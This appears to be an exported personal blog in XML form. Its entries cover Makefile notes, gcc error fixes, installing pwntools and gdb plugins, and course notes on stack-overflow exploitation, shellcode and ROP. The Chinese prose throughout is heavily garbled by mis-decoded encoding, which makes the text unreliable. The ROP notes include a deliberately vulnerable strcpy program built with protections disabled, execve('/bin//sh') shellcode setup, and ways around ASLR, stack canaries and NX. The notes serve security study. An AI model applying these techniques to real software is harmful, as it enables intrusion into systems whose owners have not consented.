è®°å½•ä¸‹æµ‹è¯•makefileç¼–å†™æ˜¯å¦æˆåŠŸæ—¶é‡åˆ°çš„ç¼ºå°‘cygwin1.dllçš„é—®é¢˜ï¼Œä¸€å¼€å§‹ä»Žè„šæœ¬ä¹‹å®¶ä¸Šä¸‹äº†ä¸ªä¸Šå¤ç‰ˆæœ¬çš„ï¼Œregsvr32 cygwin1.dllå‘çŽ°ä¸€ä¼šæ˜¯æŠ¥é”™0X0000007bï¼Œä¸€ä¼šæ˜¯æ¨¡å—cygwin1.dllå·²åŠ è½½ï¼Œä½†æ‰¾ä¸åˆ°å…¥å£ç‚¹DLLRegisterServerï¼Œæœ€åŽä»Žcygwinä¸­æ‰¾åˆ°äº†æœ€æ–°ç‰ˆæœ¬çš„ï¼Œç„¶åŽå°†cygwin64\binåŠ å…¥äº†çŽ¯å¢ƒå˜é‡ï¼ˆè¿™åº”è¯¥æ‰æ˜¯å…³é”®æ‰€åœ¨ï¼‰ï¼Œæœ€åŽè¿è¡ŒæˆåŠŸã€‚ æ ¼å¼12targets : prerequisites command Makefile æè¿°çš„æ˜¯æ–‡ä»¶ç¼–è¯‘çš„ç›¸å…³è§„åˆ™ï¼Œå®ƒçš„è§„åˆ™ä¸»è¦æ˜¯ä¸¤ä¸ªéƒ¨åˆ†ç»„æˆï¼Œåˆ†åˆ«æ˜¯ä¾èµ–çš„å…³ç³»å’Œæ‰§è¡Œçš„å‘½ä»¤ã€‚ targetsï¼šè§„åˆ™çš„ç›®æ ‡ï¼Œå¯ä»¥æ˜¯ Object Fileï¼ˆä¸€èˆ¬ç§°å®ƒä¸ºä¸­é—´æ–‡ä»¶ï¼‰ï¼Œä¹Ÿå¯ä»¥æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè¿˜å¯ä»¥æ˜¯ä¸€ä¸ªæ ‡ç­¾ï¼› prerequisitesï¼šæ˜¯æˆ‘ä»¬çš„ä¾èµ–æ–‡ä»¶ï¼Œè¦ç”Ÿæˆ targets éœ€è¦çš„æ–‡ä»¶æˆ–è€…æ˜¯ç›®æ ‡ã€‚å¯ä»¥æ˜¯å¤šä¸ªï¼Œä¹Ÿå¯ä»¥æ˜¯æ²¡æœ‰ï¼› commandï¼šmake éœ€è¦æ‰§è¡Œçš„å‘½ä»¤ï¼ˆä»»æ„çš„ shell å‘½ä»¤ï¼‰ã€‚å¯ä»¥æœ‰å¤šæ¡å‘½ä»¤ï¼Œæ¯ä¸€æ¡å‘½ä»¤å ä¸€è¡Œã€‚ æ³¨æ„ï¼šæˆ‘ä»¬çš„ç›®æ ‡å’Œä¾èµ–æ–‡ä»¶ä¹‹é—´è¦ä½¿ç”¨å†’å·åˆ†éš”å¼€ï¼Œå‘½ä»¤çš„å¼€å§‹ä¸€å®šè¦ä½¿ç”¨Tabé”®ã€‚ 12345678910111213SOURCE = XXXX.c\ XXXX.c//å¾…ç¼–è¯‘çš„æºæ–‡ä»¶ HEADER = XXXX.h\ XXXX_extern.h//å¾…ç¼–è¯‘çš„å¤´æ–‡ä»¶ INCPATH = -I../../header//å¤´æ–‡ä»¶æœç´¢è·¯å¾„LIBRARY = -L../../liball:XXXXXXXX:$(SOURCE) $(HEADER) gcc -shared -fPIC -w $(INCPATH) $(LIBRARY) -O libXXXX.so $(SOURCE)]]></content>
  </entry>
  <entry>
    <title><![CDATA[Errors]]></title>
    <url>%2F2020%2F04%2F22%2FErrors%2F</url>
    <content type="text"><![CDATA[gccç¼–è¯‘æ—¶æŠ¥é”™ 12345In file included from stacktest.c:1:0:/usr/include/stdio.h:27:10: fatal error: bits/libc-header-start.h: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½• #include &lt;bits/libc-header-start.h&gt; ^~~~~~~~~~~~~~~~~~~~~~~~~~compilation terminated. solutionï¼š 1sudo apt-get install gcc-multilib åŽŸå› ï¼š 1gccå®‰è£…çŽ¯å¢ƒæ²¡æœ‰å®‰è£…å®Œå–„ 2.åŒgccç¼–è¯‘æ—¶æŠ¥é”™ 1expected specifier-qualifier-list specifiersæ˜¯æŒ‡voidã€charã€struct Fooç­‰è¯æ±‡ï¼›qualifiersæ˜¯æŒ‡åƒconstå’Œvolatileä¸€ç±»çš„å…³é”®å­—ã€‚ä¸€ä¸ªè¯æ±‡åœ¨æœªå®šä¹‰ä¹‹å‰å°±ä½¿ç”¨å°±ä¼šå‡ºé¡¹è¿™ç§é”™è¯¯ï¼Œå¯ä»¥é€šè¿‡typedefè¿›è¡Œå®šä¹‰ä»¥åŽå†ä½¿ç”¨ã€‚ 3.å»ºè®®åœ¨ç”¨ä½œçœŸå€¼çš„èµ‹å€¼è¯­å¥å‰åŽåŠ ä¸Šæ‹¬å· çœ‹çœ‹æ˜¯ä¸æ˜¯==å†™æˆäº†=ï¼Œæ¯”è¾ƒè¯­å¥å†™æˆäº†èµ‹å€¼è¯­å¥ã€‚ 4.é­”å¹»æŠ¥é”™ 123456789In file included from ODGF_extern.h:20, from ODGF.c:14:ODGF.h:43:2: é”™è¯¯ï¼šæžšä¸¾â€˜ODGF_NOTHINGâ€™é‡å£°æ˜Ž 43 | ODGF_NOTHING = 0, | ^~~~~~~~~~~~In file included from ODGF.c:13:ODGF.h:43:2: é™„æ³¨ï¼šâ€˜ODGF_NOTHINGâ€™çš„ä¸Šä¸€ä¸ªå®šä¹‰åœ¨æ­¤ 43 | ODGF_NOTHING = 0, | ^~~~~~~~~~~~ éœ€è¦åœ¨å¤´æ–‡ä»¶é‡ŒåŠ ä¸Šé˜²æ­¢é‡å¤å®šä¹‰çš„å®å®šä¹‰ã€‚ 1234#ifndef _IT_MEAS_CLASS_H_ #define _IT_MEAS_CLASS_H_ #endif // _IT_MEAS_CLASS_H_ 4.ä»£ç ä¸­å…¨å±€å˜é‡å å†…å­˜å¤ªå¤§ï¼Ÿ 1234/usr/lib/gcc/x86_64-pc-cygwin/9.3.0/../../../../x86_64-pc-cygwin/bin/ld: /tmp/ccNBY84M.o:ODGF.c:(.text+0x17c): undefined reference to `ODGF_rq_reference_measurement&apos;/tmp/ccNBY84M.o:ODGF.c:(.text+0x17c): relocation truncated to fit: R_X86_64_PC32 against undefined symbol `ODGF_rq_reference_measurement&apos;collect2: é”™è¯¯ï¼šld è¿”å›ž 1make: *** [makefile:39ï¼šlibODGF] é”™è¯¯ 1 5.è¿è¡Œã€Šæ¸¸æˆå¤–æŒ‚æ”»é˜²è‰ºæœ¯ã€‹éšä¹¦æ–‡ä»¶æŠ¥é”™ 1åº”ç”¨ç¨‹åºæ— æ³•å¯åŠ¨ï¼Œå› ä¸ºåº”ç”¨ç¨‹åºçš„å¹¶è¡Œé…ç½®ä¸æ­£ç¡® åº”è¯¥æ˜¯ç¼ºå°‘æŸä¸ªæ”¯æŒçš„æ–‡ä»¶ï¼ŒæŸ¥çœ‹ä¸‹æ—¥å¿—ã€‚ 12345ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œcmdsxstrace.exe Trace -logfile:D:\trace.log(è‡ªå®šä¹‰path)ï¼Œå¼€å§‹è·Ÿè¸ªã€‚è¿è¡Œåº”ç”¨ç¨‹åºï¼Œå›žè½¦ï¼Œå®Œæˆè·Ÿè¸ªæŠ¥å‘Šã€‚sxstrace.exe Paese -logfile:D:\trace.log -outfile:D:\trace.txtæ‰“å¼€trace.txtæŸ¥çœ‹æ—¥å¿—ï¼Œæ‰¾åˆ°ç¼ºå°‘çš„C++åº“ã€‚ 6.Ubuntu16.04å®‰è£…pip3æŠ¥é”™ 123ä¸‹åˆ—è½¯ä»¶åŒ…æœ‰æœªæ»¡è¶³çš„ä¾èµ–å…³ç³»ï¼š gnupg : ç ´å: software-properties-common (&lt;= 0.96.24.3) ä½†æ˜¯ 0.96.20.9 æ­£è¦è¢«å®‰è£…E: é”™è¯¯ï¼ŒpkgProblemResolver::Resolve å‘ç”Ÿæ•…éšœï¼Œè¿™å¯èƒ½æ˜¯æœ‰è½¯ä»¶åŒ…è¢«è¦æ±‚ä¿æŒçŽ°çŠ¶çš„ç¼˜æ•…ã€‚ è§£å†³åŠžæ³•ï¼Œå…ˆæŠŠæŠ¥é”™çš„åŒ…ç›´æŽ¥uninstallå†ç»§ç»­å®‰è£… 1apt-get install pip3 ä¹‹åŽåˆ äº†ä¸€å †ä¸œè¥¿ï¼Œå·¦è¾¹å·¥å…·æ éƒ½ç©ºäº†ä¸€åŠï¼Œä¹Ÿä¸çŸ¥é“æœ‰ä»€ä¹ˆå½±å“ã€‚]]></content>
      <tags>
        <tag>æŠ¥é”™</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä»Žé›¶å¼€å§‹å®‰è£…pwnçŽ¯å¢ƒ]]></title>
    <url>%2F2020%2F04%2F21%2F%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AE%89%E8%A3%85pwn%E7%8E%AF%E5%A2%83%2F</url>
    <content type="text"><![CDATA[ä»Šå¤©å­¦ç€å­¦ç€è¦æ”¹ç”¨æˆ·æƒé™ï¼Œç»“æžœä¸€æ”¹ä¹‹å‰çš„çŽ¯å¢ƒä¸€æ¦‚æ‰¾ä¸åˆ°äº†ï¼ˆè´¦å·è¿›ä¸åŽ»äº†ï¼‰ã€‚åˆå¾—ä»Žé›¶å¼€å§‹æŠŠPwnçŽ¯å¢ƒç»™å®‰è£…ä¸Šï¼Œå……åˆ†è¯´æ˜Žäº†è™šæ‹Ÿæœºå¿«ç…§ä»¥åŠç‰©ç†æœºå¤‡ä»½çš„é‡è¦æ€§ã€‚ ä¿®æ”¹æºä¸ºé˜¿é‡Œäº‘æºæ¢æºæ˜¯ä¸€åˆ‡åŸºæœ¬è®¾ç½®çš„åŸºç¡€ï¼Œåœ¨æ›´æ–°ç³»ç»Ÿæœ¬èº«ä¹‹å‰å°±æ¢èƒ½å¤ŸåŠ å¿«é€Ÿåº¦ã€‚ å¤‡ä»½ 1sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak å®‰è£…vim 1sudo apt-get install vim ç¼–è¾‘æºæ–‡ä»¶ 1sudo vim /etc/apt/sources.list å°†æ‰€æœ‰åŽŸæœ‰å†…å®¹æ³¨é‡ŠæŽ‰ï¼ŒåŠ ä¸Šå¦‚ä¸‹è¯­å¥ï¼Œè¿˜æ˜¯é˜¿é‡Œäº‘æºå¥½ç”¨ã€‚ 12345678910deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse æ›´æ–°è½¯ä»¶åˆ—è¡¨ 1sudo apt-get update æ›´æ–°è½¯ä»¶åŒ… 1sudo apt-get upgrade Pwntoolså®‰è£…pip3 1sudo apt install python3-pip å®‰è£…git 1sudo apt install git å…‹éš†pwntoolsåˆ°æœ¬åœ° 1git clone https://github.com/Gallopsled/pwntools å„ç§æº 1234é˜¿é‡Œäº‘ http://mirrors.aliyun.com/pypi/simple/ä¸­ç§‘å¤§https://mirrors.tuna.tsinghua.edu.cn/pypi/web/simple/è±†ç“£http://pypi.doubanio.com/simple/æ¸…åŽhttps://pypi.tuna.tsinghua.edu.cn/simple/ å®‰è£… 1sudo python3 setup.py install ä¸æ–­æŠ¥é”™ç¼ºå°‘å„ç§åŒ…ï¼Œåè¡€ 1pip3 install pwntools -i https://pypi.tuna.tsinghua.edu.cn/simple/ Pwndbg123git clone https://github.com/pwndbg/pwndbgcd pwndbgsudo ./setup.sh Ubuntué™„å¸¦äº†ä¸€ä¸ªæ¥è‡ªå‰å¯’æ­¦çºªçš„PIPç‰ˆæœ¬ï¼Œå¦‚æžœä½ ä¸æƒ³èŠ±å¾ˆå¤šæ—¶é—´è°ƒè¯•çš„è¯å°±å¿…é¡»å‡çº§ä»–ã€‚ 1234apt-get remove python-pip python3-pipwget https://bootstrap.pypa.io/get-pip.pypython get-pip.pypython3 get-pip.py peda12git clone https://github.com/longld/peda.git ~/pedaecho &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit åˆ‡æ¢1vim ~/.gdbinit è¦å“ªä¸ªæ³¨é‡ŠæŽ‰å…¶ä»–ä¸¤ä¸ª åŽç»­åº”è¯¥è¿˜è¦å®‰è£…åˆ«çš„å·¥å…·ï¼Œå†è¿›è¡Œè¡¥å……ã€‚]]></content>
  </entry>
  <entry>
    <title><![CDATA[é•¿äº­å…¬å¼€è¯¾ä¹‹ROP]]></title>
    <url>%2F2020%2F04%2F20%2F%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE%E4%B9%8BROP%2F</url>
    <content type="text"><![CDATA[æ ˆæº¢å‡ºä¸ŽShellcodeæ ˆæº¢å‡ºåˆ©ç”¨æ€è·¯ä¿æŠ¤åŠç¼–è¯‘é€‰é¡¹æ ˆä¸å¯æ‰§è¡Œ 1-z exestack canaryä¿æŠ¤ 1-fno-stack-protector 1gcc ä»¥ä¸Šä¸¤ä¸ªå‚æ•° name.c -o name -m32 æ ˆå¸ƒå±€Stack Layout1234567891011Example BOF programï¼š#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc,char **argv)&#123; char buf[128]; if (argc &lt; 2) return 1; strcpy(buf,argv[1]); printf(&quot;argv[1]:%s\n&quot;,buf); return 0;&#125; char **argv é«˜åœ°å€ï¼Œå‡½æ•°å‚æ•° int argc å‡½æ•°å‚æ•° return address å‡½æ•°è¢«callæ—¶æ”¾å…¥æ ˆå†… saved %ebp å‡½æ•°å¼€å¤´push ebp char buf[128] char buf[128] ä½Žåœ°å€ï¼Œæ‹·è´æ—¶â†‘ å¯ä»¥çœ‹å‡ºCè¯­è¨€ä¼ å‚æ˜¯ä»Žå³å‘å·¦ä¼ çš„ï¼Œæœ€å³è¾¹çš„æœ€å…ˆå…¥æ ˆã€‚ mov esp,ebp æ¢å¤ä¸»è°ƒå‡½æ•°çš„æ ˆé¡¶æŒ‡é’ˆespï¼Œå°†å…¶æŒ‡å‘è¢«è°ƒå‡½æ•°æ ˆåº•ã€‚æ­¤æ—¶å±€éƒ¨å˜é‡å ç”¨çš„æ ˆç©ºé—´è¢«é‡Šæ”¾ï¼Œä½†å˜é‡å†…å®¹æœªè¢«æ¸…æ¥šã€‚ pop ebp ä¸»è°ƒå‡½æ•°çš„å¸§åŸºæŒ‡é’ˆ%ebpå‡ºæ ˆï¼Œå³æ¢å¤ä¸»è°ƒå‡½æ•°æ ˆåº•ã€‚æ­¤æ—¶ï¼Œæ ˆé¡¶æŒ‡é’ˆ%espæŒ‡å‘ä¸»è°ƒå‡½æ•°æ ˆé¡¶(espÃŸesp-4)ï¼Œäº¦å³è¿”å›žåœ°å€å­˜æ”¾å¤„ã€‚ ret ä»Žæ ˆé¡¶å¼¹å‡ºä¸»è°ƒå‡½æ•°åŽ‹åœ¨æ ˆä¸­çš„è¿”å›žåœ°å€åˆ°æŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨%eipä¸­ï¼Œè·³å›žä¸»è°ƒå‡½æ•°è¯¥ä½ç½®å¤„ç»§ç»­æ‰§è¡Œã€‚å†ç”±ä¸»è°ƒå‡½æ•°æ¢å¤åˆ°è°ƒç”¨å‰çš„æ ˆã€‚ å‰ä¸¤æ¡æŒ‡ä»¤ä¹Ÿå¯ä»¥ç”±leaveå®žçŽ°ï¼Œå…·ä½“ç”¨å“ªç§æ–¹å¼ç”±ç¼–è¯‘å™¨å†³å®šã€‚ ä»Žç‰©ç†ä¸Šæ¥è¯´ï¼ŒCALL æŒ‡ä»¤å°†å…¶è¿”å›žåœ°å€åŽ‹å…¥å †æ ˆï¼Œå†æŠŠè¢«è°ƒç”¨è¿‡ç¨‹çš„åœ°å€å¤åˆ¶åˆ°æŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨ã€‚å½“è¿‡ç¨‹å‡†å¤‡è¿”å›žæ—¶ï¼Œå®ƒçš„ RET æŒ‡ä»¤ä»Žå †æ ˆæŠŠè¿”å›žåœ°å€å¼¹å›žåˆ°æŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨ã€‚32 ä½æ¨¡å¼ä¸‹ï¼ŒCPU æ‰§è¡Œçš„æŒ‡ä»¤ç”± EIPï¼ˆæŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨ï¼‰åœ¨å†…å­˜ä¸­æŒ‡å²€ã€‚ å¯ä»¥æŠŠShellcodeæ”¾åœ¨ç¼“å†²åŒºå¼€å¤´ï¼Œç„¶åŽé€šè¿‡è¦†ç›–è¿”å›žåœ°å€è·³è½¬åˆ°Shellcodeã€‚ ä¹Ÿå¯ä»¥å°†Shellcodeæ”¾åœ¨è¿”å›žåœ°å€ä¹‹åŽï¼Œç„¶åŽé€šè¿‡è¦†ç›–è¿”å›žåœ°å€è·³è½¬åˆ°Shellcodeï¼Œå¯ä»¥ä¸é™é•¿åº¦ã€‚ â†’JMP ESPï¼Œå°†è¿”å›žåœ°å€è·³è½¬åˆ°JMP ESPä¸Šã€‚å½“å‡½æ•°è¿”å›žæ—¶espæŒ‡å‘addråŽï¼Œä¸ç”¨çŸ¥é“æ ˆå…·ä½“åœ¨å“ªã€‚ æ ˆä¸å¤Ÿshellcodeæ”¾åœ¨addråŽï¼Œæ ˆå¤Ÿäº†æ”¾åœ¨addrå‰ã€‚ å…¶ä¸­ï¼Œä¸»è°ƒå‡½æ•°å°†å‚æ•°æŒ‰ç…§è°ƒç”¨çº¦å®šä¾æ¬¡å…¥æ ˆï¼Œç„¶åŽå°†æŒ‡ä»¤æŒ‡é’ˆEIPå…¥æ ˆä»¥ä¿å­˜ä¸»è°ƒå‡½æ•°çš„è¿”å›žåœ°å€(ä¸‹ä¸€æ¡å¾…æ‰§è¡ŒæŒ‡ä»¤çš„åœ°å€)ã€‚è¿›å…¥è¢«è°ƒå‡½æ•°æ—¶ï¼Œè¢«è°ƒå‡½æ•°å°†ä¸»è°ƒå‡½æ•°çš„å¸§åŸºæŒ‡é’ˆEBPå…¥æ ˆï¼Œå¹¶å°†ä¸»è°ƒå‡½æ•°çš„æ ˆé¡¶æŒ‡é’ˆESPå€¼èµ‹ç»™è¢«è°ƒå‡½æ•°çš„EBP(ä½œä¸ºè¢«è°ƒå‡½æ•°çš„æ ˆåº•)ï¼ŒæŽ¥ç€æ”¹å˜ESPå€¼æ¥ä¸ºå‡½æ•°å±€éƒ¨å˜é‡é¢„ç•™ç©ºé—´ã€‚æ­¤æ—¶è¢«è°ƒå‡½æ•°å¸§åŸºæŒ‡é’ˆæŒ‡å‘è¢«è°ƒå‡½æ•°çš„æ ˆåº•ã€‚ä»¥è¯¥åœ°å€ä¸ºåŸºå‡†ï¼Œå‘ä¸Š(æ ˆåº•æ–¹å‘)å¯èŽ·å–ä¸»è°ƒå‡½æ•°çš„è¿”å›žåœ°å€ã€å‚æ•°å€¼ï¼Œå‘ä¸‹(æ ˆé¡¶æ–¹å‘)èƒ½èŽ·å–è¢«è°ƒå‡½æ•°çš„å±€éƒ¨å˜é‡å€¼ï¼Œè€Œè¯¥åœ°å€å¤„åˆå­˜æ”¾ç€ä¸Šä¸€å±‚ä¸»è°ƒå‡½æ•°çš„å¸§åŸºæŒ‡é’ˆå€¼ã€‚æœ¬çº§è°ƒç”¨ç»“æŸåŽï¼Œå°†EBPæŒ‡é’ˆå€¼èµ‹ç»™ESPï¼Œä½¿ESPå†æ¬¡æŒ‡å‘è¢«è°ƒå‡½æ•°æ ˆåº•ä»¥é‡Šæ”¾å±€éƒ¨å˜é‡ï¼›å†å°†å·²åŽ‹æ ˆçš„ä¸»è°ƒå‡½æ•°å¸§åŸºæŒ‡é’ˆå¼¹å‡ºåˆ°EBPï¼Œå¹¶å¼¹å‡ºè¿”å›žåœ°å€åˆ°EIPã€‚ESPç»§ç»­ä¸Šç§»è¶Šè¿‡å‚æ•°ï¼Œæœ€ç»ˆå›žåˆ°å‡½æ•°è°ƒç”¨å‰çš„çŠ¶æ€ï¼Œå³æ¢å¤åŽŸæ¥ä¸»è°ƒå‡½æ•°çš„æ ˆå¸§ã€‚å¦‚æ­¤é€’å½’ä¾¿å½¢æˆå‡½æ•°è°ƒç”¨æ ˆã€‚ Shellcodeçš„ç¼–å†™è°ƒè¯•å’Œç”Ÿæˆshellcodeï¼šåœ¨è½¯ä»¶æ¼æ´žåˆ©ç”¨ä¸­ç»å¸¸ç”¨åˆ°çš„ä¸€å°æ®µä»£ç ï¼Œé€šå¸¸ç”¨äºŽä¸ºæ”»å‡»è€…å¯åŠ¨ä¸€ä¸ªèƒ½æŽ§åˆ¶å’Œå—å®³è€…æœºå™¨çš„shellã€‚æˆ‘ä»¬ä½¿ç”¨çš„shellcode:åˆ©ç”¨execveç³»ç»Ÿè°ƒç”¨æ¥èŽ·å¾—ä¸€ä¸ªé«˜æƒé™shellã€‚ Linuxä¸‹çš„æ‰§è¡Œæ–‡ä»¶å‡½æ•°åŽŸåž‹ï¼š 1int execve(const char *filename,char *const argv[],char *const envp[]);//æ–‡ä»¶åï¼Œå‚æ•°ï¼ŒçŽ¯å¢ƒå˜é‡ shellcode: 1execve(&quot;/bin//sh&quot;,Null,Null) Syscallè°ƒç”¨çº¦å®šï¼š syscall number:%eax=0xb 0 ç¬¬ä¸€ä¸ªå‚æ•°:%ebx=filename 0x68732f2f=â€™//shâ€™ 0x6e69622f=â€™/bin/ ç¬¬äºŒä¸ªå‚æ•°:%ecx=argv 0 ç¬¬ä¸‰ä¸ªå‚æ•°:%edx=envp=0 ç¬¬å››ä¸ªå‚æ•°:%esi X ç¬¬äº”ä¸ªå‚æ•° :%edi X ç¬¬å…­ä¸ªå‚æ•°:%ebp X /ä¸Ž//ï¼Œå‡‘å­—èŠ‚ã€‚å­—ç¬¦ä¸²ä»¥0ç»“å°¾ã€‚ å¯»æ‰¾å¡«å……é•¿åº¦ï¼šæ‰¾åˆ°ç¼“å†²åŒºå¼€å¤´çš„åœ°å€ï¼Œå†æ‰¾åˆ°è¿”å›žåœ°å€æ‰€åœ¨ä½ç½®ï¼Œä¸¤è€…ç›¸å‡å³å¯ã€‚ä¸ºäº†æ‰¾åˆ°ç¼“å†²åŒºå¼€å¤´åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è°ƒç”¨strcpyä¹‹å‰ä¸‹æ–­ç‚¹ï¼Œé€šè¿‡æŸ¥çœ‹strcpyçš„ç¬¬ä¸€ä¸ªå‚æ•°å¾—çŸ¥ã€‚å¦å¤–å¯åœ¨mainå‡½æ•°ä¹‹å‰æ–­ä¸‹ï¼Œæ­¤æ—¶espæŒ‡å‘çš„å°±æ˜¯è¿”å›žåœ°å€æ‰€åœ¨ä½ç½®ã€‚ gdbå‘½ä»¤ï¼šx/2wx $esp//xè¡¨ç¤ºæ‰“å°ï¼Œ/2è¡¨ç¤ºæ‰“å°ä¸¤ä¸ªå€¼ï¼Œwè¡¨ç¤ºwordå¤§å°ï¼Œxä¸ºåå…­è¿›åˆ¶ã€‚ NOP sledï¼šå¢žåŠ shellcodeçš„é•¿åº¦ï¼Œä»Žè€Œæé«˜å‘½ä¸­çŽ‡ã€‚åªè¦ç¨‹åºè¿”å›žåˆ°äº†å¢žåŠ çš„è®¸å¤šä¸ªnopä¹‹ä¸­çš„ä»»æ„ä¸€å¤„ï¼Œå°±ä¼šæ‰§è¡Œshellcodeã€‚ åœ¨gdbä¸­è¿è¡Œç¨‹åºï¼Œgdbä¼šä¸ºè¿›ç¨‹å¢žåŠ è®¸å¤šçŽ¯å¢ƒå˜é‡ï¼Œå­˜å‚¨åœ¨æ ˆä¸Šï¼Œå¯¼è‡´æ ˆç”¨çš„æ›´å¤šï¼Œæ ˆçš„åœ°å€å˜ä½Žäº†ã€‚ç›´æŽ¥è¿è¡Œæ—¶ï¼Œæ ˆåœ°å€ä¼šæ¯”gdbä¸­é«˜ï¼Œæ‰€ä»¥åœ¨gdbä¸­çš„shellcodeåœ°å€å°±ä¸ç®¡ç”¨äº†ã€‚æ‰€ä»¥åˆ©ç”¨NOP sledï¼Œåœ¨shellcodeå‰å¢žåŠ ä¸€ä¸²nopé“¾ï¼Œåªè¦å‘½ä¸­ä»»æ„ä¸€ä¸ªNOPå³å¯ã€‚ ä»ŽReturn to libcåˆ°ROPæ¼æ´žç¼“è§£æŽªæ–½Mitigationå³ä¾¿æ¼æ´žå­˜åœ¨ï¼Œä¹Ÿè¦è®©æ”»å‡»è€…éš¾ä»¥åˆ©ç”¨ã€‚æ“ä½œç³»ç»Ÿå’Œç¼–è¯‘å™¨éƒ½ä¼šæä¾›ã€‚ å¦‚ä½•é˜»æ­¢æ”»å‡»è€…åˆ©ç”¨ï¼šéšæœºæ ˆåœ°å€å †åœ°å€ç­‰åœ°å€ï¼Œè®©æ”»å‡»è€…æ— æ³•çŸ¥é“shellcodeåœ°å€ï¼Œæ— å¤„è·³è½¬ã€‚ æƒ³åŠžæ³•æ£€æµ‹æ ˆæº¢å‡ºï¼Œæ£€æµ‹åˆ°æŠ¥é”™åˆ™é€€å‡ºã€‚ æ ˆä¸Šä¸èƒ½æ‰§è¡Œshellcode å…·ä½“å®žçŽ°åˆ†åˆ«ä¸ºALSR PIE/Stack Canary Stack Cooike/NX/W^X/DEP ALSRï¼šå¼€å¯éšæœºåŒ–ä¹‹åŽï¼Œä¼šåœ¨å †æ ˆä»¥åŠå…±äº«åº“åŠ è½½çš„æ—¶å€™ï¼Œè®©æ ˆå¾€ä¸‹ç§»ï¼Œå †å¾€ä¸Šç§»ï¼Œå…±äº«åº“ä¹Ÿç•™æœ‰ç©ºç™½ï¼Œå®žçŽ°éšæœºåŒ–ã€‚å¤§é‡IOTè®¾å¤‡ä»æœªå¯ç”¨ã€‚ /proc/sys/kernel/randomize_va_space æ¥æŽ§åˆ¶ ASLR å¯åŠ¨ä¸Žå¦ï¼š 1230ï¼Œå…³é—­ ASLRï¼Œæ²¡æœ‰éšæœºåŒ–ã€‚æ ˆã€å †ã€.so çš„åŸºåœ°å€æ¯æ¬¡éƒ½ç›¸åŒã€‚1ï¼Œæ™®é€šçš„ ASLRã€‚æ ˆåŸºåœ°å€ã€mmap åŸºåœ°å€ã€.so åŠ è½½åŸºåœ°å€éƒ½å°†è¢«éšæœºåŒ–ï¼Œä½†æ˜¯å †åŸºåœ°å€æ²¡æœ‰éšæœºåŒ–ã€‚2ï¼Œå¢žå¼ºçš„ ASLRï¼Œåœ¨ 1 çš„åŸºç¡€ä¸Šï¼Œå¢žåŠ äº†å †åŸºåœ°å€éšæœºåŒ–ã€‚ PIEå®žé™…ä¸Šæ˜¯ä»£ç éšæœºã€‚åªå¼€å¯ALSRï¼Œæ ˆï¼Œå…±äº«åº“ï¼Œå †åœ°å€ä¼šè¢«éšæœºåŒ–ï¼Œä½†æ˜¯ç¨‹åºæœ¬èº«ä»£ç é€šå¸¸å›ºå®šåœ¨0x80480000.å¼€å¯PIEï¼Œç¼–è¯‘å™¨å¯ä»¥åœ¨ç¼–è¯‘æ—¶ç”Ÿæˆåœ°å€æ— å…³ä»£ç ï¼Œç¨‹åºå¯ä»¥åŠ è½½åœ¨ä»»æ„åœ°å€æ‰§è¡Œã€‚ åœ°å€ç©ºé—´éšæœºåŒ–ç»•è¿‡æ€è·¯ï¼šæœªå¼€å¯PIEï¼ŒReturn to PLTï¼Œå¯ç»•è¿‡å…±äº«åº“éšæœºåŒ–ã€‚/X86_32æž¶æž„ä¸‹å¯çˆ†ç ´ï¼Œå†…å­˜åœ°å€éšæœºåŒ–åŠ›åº¦ä»¥ä¸€ä¸ªå†…å­˜é¡µä¸ºå•ä½ï¼Œ0x1000å­—èŠ‚å¯¹é½ã€‚/ä¿¡æ¯æ³„éœ²/NOP sledï¼šåœ¨shellcodeå‰ä¸çŸ¥ä¸€é•¿ä¸²æŒ‡ä»¤/å †å–·Heap spray/æœ¬åœ°çŽ¯å¢ƒæŠ€å·§ï¼šulimit -s unlimitedã€‚ canaryï¼šåŽŸç†ä¸å†èµ˜è¿°ï¼Œå‡ºé¢˜æ—¶gccçš„-fstack-protectoré€‰é¡¹å¯ä»¥å¯ç”¨è¿™ä¸€æœºåˆ¶ã€‚ ç»•è¿‡ï¼šæ³„éœ²canaryï¼Œæ¯ä¸ªçº¿ç¨‹ä¸åŒå‡½æ•°çš„canaryéƒ½ç›¸åŒã€‚/åªè¦†ç›–å±€éƒ¨å˜é‡ï¼Œä¸è¦†ç›–è¿”å›žåœ°å€ã€‚/ä¿®æ”¹Thread-local Strorageä¸­çš„Canaryã€‚ï¼ˆä¿®æ”¹å¯¹ç…§çš„æ ·æœ¬ï¼‰ NXï¼šå†…å­˜æƒé™ç²¾ç»†åˆ’åˆ† ç»•è¿‡æ–¹æ³•ï¼šReturn-to-libc/ROPï¼Œåˆ©ç”¨ç¨‹åºæœ¬èº«çš„ä»£ç åŽ»æ‰§è¡Œæƒ³è¦çš„æ“ä½œã€‚ èŽ·å–å‡½æ•°å’Œä»£ç ç‰‡æ®µçš„æ–¹æ³•ï¼šåŠ¨æ€è°ƒè¯•ä¸Žé™æ€è°ƒè¯• 